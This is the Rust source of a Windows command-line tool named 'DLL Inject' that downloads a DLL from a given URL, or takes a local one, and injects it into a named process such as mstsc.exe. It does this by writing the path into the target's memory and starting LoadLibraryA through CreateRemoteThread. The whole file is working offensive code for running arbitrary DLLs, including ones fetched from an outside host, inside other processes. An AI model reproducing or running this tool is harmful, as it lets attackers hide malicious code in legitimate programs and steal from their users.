use std::{ptr, os::raw::c_void, env, path::PathBuf, fs::File, io::Write, process::exit};

use reqwest::blocking::Response;
use sysinfo::{System, SystemExt, ProcessExt, PidExt};
use windows::{Win32::{Foundation::{HANDLE, FARPROC, GetLastError, WIN32_ERROR, CloseHandle}, System::{Threading::{OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, CreateRemoteThread}, Memory::{VirtualAllocEx, MEM_COMMIT, PAGE_EXECUTE_READ, MEM_RESERVE}, Diagnostics::Debug::WriteProcessMemory, LibraryLoader::{GetProcAddress, GetModuleHandleA}}}, s};
use clap::{Arg, App, ArgMatches};

fn get_process(p_name: &str) -> u32 {
    let mut sys = System::new_all();
    sys.refresh_all();

    let mut pid: u32 = 0;
    for (proc_id, process) in sys.processes() {
        if process.name().to_lowercase() == p_name.to_lowercase() {
           pid = proc_id.as_u32();
           break;
        }
    }
    pid
}

fn get_path(url: Option<&String>, l_file: Option<&String>) -> String {
    if url.is_some() {
        println!("[+] Downloading DLL");
        let resp: Response = reqwest::blocking::get(url.unwrap()).unwrap();
        if !resp.status().is_success() {
            println!("[!] Error fetching DLL!");
            exit(1);
        }
        let file_bytes: Vec<u8> = resp.bytes().unwrap().to_vec();

        let mut f_path: PathBuf = env::temp_dir();
        let filename: Vec<&str> = url.unwrap().rsplit("/").collect();
        f_path.push(filename[0]);
        let mut f: File = File::create(&f_path).unwrap();
        f.write_all(&file_bytes).expect("Error writing data to file");
        return f_path.display().to_string();
    } else {
        return l_file.unwrap().to_string();
    }
}

fn main() {
    let args: ArgMatches = App::new("DLL Inject")
        .author("0xbu117")
        .about("Takes a remote or local DLL and injects it into a target process.")
        .arg(Arg::with_name("url")
            .short('u')
            .long("url")
            .takes_value(true)
            .help("URL to remote dll file."))
        .arg(Arg::with_name("process")
            .short('p')
            .long("process")
            .takes_value(true)
            .required(true)
            .help("Process name to inject into. e.g., mstsc.exe"))
        .arg(Arg::with_name("local")
            .short('l')
            .long("local")
            .takes_value(true)
            .help("Path to local DLL."))
        .get_matches();
    
    let url: Option<&String> = args.get_one::<String>("url");
    let p_name: &String = args.get_one::<String>("process").unwrap();
    let l_path: Option<&String> = args.get_one::<String>("local");

    if url.is_none() && l_path.is_none() {
        println!("[!] Must pass either url or local path");
        exit(1);
    }

    println!("[+] Finding process");
    let pid: u32 = get_process(p_name);
    if pid == 0 {
        println!("[!] Process not found!");
        exit(1);
    }
    println!("[+] Found pid! {}", pid);

    let mut dll_path: String = get_path(url, l_path);
    let p_len: usize = dll_path.len();
    println!("[+] DLL path: {dll_path}");
    let dll_path_bytes: &mut [u8] = unsafe { dll_path.as_bytes_mut() };

    unsafe {
        println!("[+] Opening handle to process");
        let h_proc: HANDLE = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            false,
            pid).unwrap();

        println!("[+] Allocating memory");
        let exec_mem: *mut c_void = VirtualAllocEx(
            h_proc,
            ptr::null_mut(),
            p_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READ
        );

        let mut out_bytes: usize = 0;
        println!("[+] Copying dll path into memory");
        if !WriteProcessMemory(
            h_proc,
            exec_mem,
            dll_path_bytes.as_mut_ptr() as *mut c_void,
            p_len,
            &mut out_bytes as *mut usize
        ).as_bool() {
            let e: WIN32_ERROR = GetLastError();
            panic!("[!] Error copying bytes {:?}", e);
        }

        println!("[+] Getting address of LoadLibraryA");
        let hinst: windows::Win32::Foundation::HINSTANCE = GetModuleHandleA(s!("kernel32.dll")).unwrap();
        let lib_addr: FARPROC = GetProcAddress(hinst, s!("LoadLibraryA"));
        println!("[+] Injecting DLL");
        let la: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(lib_addr) };
        CreateRemoteThread(
            h_proc,
            ptr::null_mut(),
            0,
            Some(la),
            exec_mem,
            0,
            ptr::null_mut()
        ).unwrap();
        CloseHandle(h_proc);
    }
}

